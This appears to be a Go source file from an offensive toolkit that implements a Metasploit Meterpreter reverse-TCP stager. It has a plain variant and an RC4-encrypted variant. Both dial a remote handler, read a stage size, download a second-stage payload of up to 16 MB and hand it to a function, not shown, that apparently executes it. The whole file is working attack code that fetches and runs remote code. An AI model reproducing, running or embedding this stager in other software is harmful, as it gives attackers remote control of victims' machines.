package meterpreter

import (
	"crypto/rc4"
	"encoding/binary"
	"io"
	"net"

	"github.com/pkg/errors"
)

// ReverseTCP is used to connect Metasploit handler.
func ReverseTCP(network, address, method string) error {
	rAddr, err := net.ResolveTCPAddr(network, address)
	if err != nil {
		return err
	}
	conn, err := net.DialTCP(network, nil, rAddr)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()
	// receive stage size
	stageSizeBuf := make([]byte, 4)
	_, err = io.ReadFull(conn, stageSizeBuf)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage size")
	}
	stageSize := int(binary.LittleEndian.Uint32(stageSizeBuf))
	if stageSize < 128 {
		return errors.New("stage is too small that < 128 Byte")
	}
	if stageSize > 16<<20 {
		return errors.New("stage is too big that > 16 MB")
	}
	// receive stage
	stage := make([]byte, stageSize)
	_, err = io.ReadFull(conn, stage)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage")
	}
	return reverseTCP(conn, stage, method)
}

// ReverseTCPRC4 is used to connect Metasploit handler with RC4.
func ReverseTCPRC4(network, address, method string, key []byte) error {
	rAddr, err := net.ResolveTCPAddr(network, address)
	if err != nil {
		return err
	}
	conn, err := net.DialTCP(network, nil, rAddr)
	if err != nil {
		return err
	}
	defer func() { _ = conn.Close() }()
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return errors.WithStack(err)
	}
	// receive stage size
	stageSizeEncBuf := make([]byte, 4)
	_, err = io.ReadFull(conn, stageSizeEncBuf)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage size")
	}
	// decrypt stage size
	asd := make([]byte, 4)
	cipher.XORKeyStream(asd, stageSizeEncBuf)
	stageSize := int(binary.LittleEndian.Uint32(asd))
	if stageSize < 128 {
		return errors.New("stage is too small that < 128 Byte")
	}
	if stageSize > 16<<20 {
		return errors.New("stage is too big that > 16 MB")
	}
	// receive stage
	stage := make([]byte, stageSize)
	_, err = io.ReadFull(conn, stage)
	if err != nil {
		return errors.Wrap(err, "failed to receive stage")
	}
	// decrypt stage
	cipher.XORKeyStream(stage, stage)
	return reverseTCP(conn, stage, method)
}
